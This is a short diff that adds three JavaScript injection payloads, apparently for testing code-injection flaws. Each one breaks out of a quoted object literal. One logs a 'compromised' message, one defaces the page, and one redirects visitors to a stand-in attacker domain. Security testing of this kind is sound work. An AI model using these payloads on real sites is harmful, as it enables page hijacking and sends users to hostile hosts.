@@ -1,0 +1,8 @@
+Console logging:
+'}); console.log('Data has been compromised!'); ({'dummy':'
+
+web page manipulation:
+'}); document.body.innerHTML = '<h1>Page Hacked!</h1>'; ({'dummy':'
+
+Redirecting the user
+'}); window.location.href = 'https://attacker-domain.com'; ({'dummy':'
